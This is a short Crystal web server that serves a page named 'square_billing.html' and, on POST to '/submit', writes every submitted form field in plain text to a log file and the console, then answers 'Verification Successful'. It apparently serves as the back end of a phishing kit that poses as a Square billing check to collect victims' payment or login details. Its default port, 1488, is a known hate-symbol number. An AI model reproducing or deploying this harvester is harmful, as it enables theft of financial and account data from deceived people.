require "http/server"
require "log"
require "json"
require "uri"

# ---- Configuration ----
PORT = (ENV["PORT"]? || "1488").to_i
HOST = ENV["HOST"]? || "0.0.0.0"
AUDIT_LOG = ENV["AUDIT_LOG"]? || "audit_logs.txt"
VIEW_PATH = "views/square_billing.html"

# ---- Logging ----
Log.setup do |config|
  backend = Log::IOBackend.new(STDOUT)
  config.bind "server", :info, backend
end

LOGGER = Log.for("server")

# ---- Helpers ----
def render_view(path : String) : String
  File.read(path)
rescue
  "<h1>Template Missing</h1>"
end

def parse_form(body : String) : Hash(String, String)
  URI::Params.parse(body).to_h
end

# ---- Router ----
handler = HTTP::Handler::ProcHandler.new do |ctx|
  begin
    case {ctx.request.method, ctx.request.path}
    when {"GET", "/"}
      ctx.response.content_type = "text/html; charset=utf-8"
      ctx.response.print render_view(VIEW_PATH)

    when {"POST", "/submit"}
      raw = ctx.request.body.try &.gets_to_end || ""
      data = parse_form(raw)

      LOGGER.info { "Received: #{data}" }

      File.open(AUDIT_LOG, "a") { |f| f.puts data.to_json }

      ctx.response.content_type = "text/plain"
      ctx.response.print "Verification Successful"

    else
      ctx.response.status_code = 404
      ctx.response.print "Not Found"
    end

  rescue ex
    LOGGER.error { "Error: #{ex.message}\n#{ex.backtrace.join("\n")}" }
    ctx.response.status_code = 500
    ctx.response.print "Internal Server Error"
  end
end

server = HTTP::Server.new(handler)
server.bind_tcp(HOST, PORT)

LOGGER.info { "Server running on #{HOST}:#{PORT}" }

# ---- Graceful Shutdown ----
Signal::INT.trap do
  LOGGER.info { "SIGINT received, shutting down" }
  server.close
end

Signal::TERM.trap do
  LOGGER.info { "SIGTERM received, shutting down" }
  server.close
end

server.listen
